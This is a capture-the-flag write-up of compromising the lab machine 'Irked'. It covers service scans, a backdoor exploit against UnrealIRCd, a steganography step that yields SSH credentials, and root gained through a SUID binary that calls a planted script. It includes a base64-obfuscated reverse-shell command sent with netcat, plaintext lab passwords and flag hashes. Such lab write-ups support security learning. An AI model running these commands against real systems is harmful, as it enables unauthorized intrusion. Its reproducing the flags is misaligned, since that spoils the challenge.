
Target : 10.129.36.171

Started off with the port scan :   22,80,111,6697,8067,40584,65534    

```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          40584/tcp   status
|   100024  1          55317/udp   status
|   100024  1          59025/tcp6  status
|_  100024  1          59897/udp6  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
40584/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerating port : 111 (rpcbind)

`rpcinfo -p $ip`    `rpcinfo -s $ip`

![](../Pasted%20image%2020260720095442.png)

Enumerating Port : 80

Directory bruteforcing using gobuster:

`gobuster dir -u "http://10.129.36.171/" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt`

But, got nothing interesting.

Enumerating Port : 6697

Adding `irked.htb` in /etc/hosts

```
nc irked.htb 6697

:irked.htb NOTICE AUTH :*** Looking up your hostname...
kali
GET:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
:irked.htb 451 kali :You have not registered
www-data
:irked.htb 451 www-data :You have not registered

```

UnrealIRCD is vulnerable to backdoor Command execution and it has metasploit exploitation module.

CVE-2010-2075 (UnrealIRCd 3.2.8.1 Backdoor): `unix/irc/unreal_ircd_3281_backdoor `

Manual exploitation:

`echo "AB; echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjQxLzQ0NDQgMD4mMQ== | base64 -d | bash" | nc 10.129.36.171 65534`

![](../Pasted%20image%2020260720105048.png)

![](../Pasted%20image%2020260720105119.png)

Got the shell as user `ircd`

Let's check unrealircd.conf

```
login           stskeeps;
password        moocowsrulemyworld;
```

But it's not worked.

then found a backup file in `djmardov` user directory.

`find / -name "*backup*" 2>/dev/null`

```
cat /home/djmardov/Documents/.backup

Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

While enumerating port: 80, found an image, which could be a hint to do stego. let's check

`http://10.129.36.171/irked.jpg`

`steghide extract -p UPupDOWNdownLRlrBAbaSSss -sf irked.jpg`

![](../Pasted%20image%2020260720111759.png)

Got the credential for `djmardov : Kab6h+m+bbp2J:HG`

Let's connect using ssh: `ssh djmardov@irked.htb`

```
djmardov@irked:~$ cat user.txt 
4110f7cbf599a369888034d4ce3f4383
```

Root Escalation:

![](../Pasted%20image%2020260720112943.png)

While executing `/usr/bin/viewuser` it throws an error

![](../Pasted%20image%2020260720113036.png)

let's create a binary `listusers` in tmp folder

```listusers
#!/bin/bash -p

/bin/bash
```

`chmod +x listusers`

Let's trigger it to get the root access.

![](../Pasted%20image%2020260720113455.png)

`root.txt : ce1009c8a559517d4ae19417ec186c15`

To be noted:

1. Identified the initial foothold entrypoint, but dependent on metasploit exploitation, and once its failed, haven't checked manual exploitation. 
2. For root escalation, identified the suid binaries and once i found the `viewuser` is the escalation path, exploited it directly and got the flag.
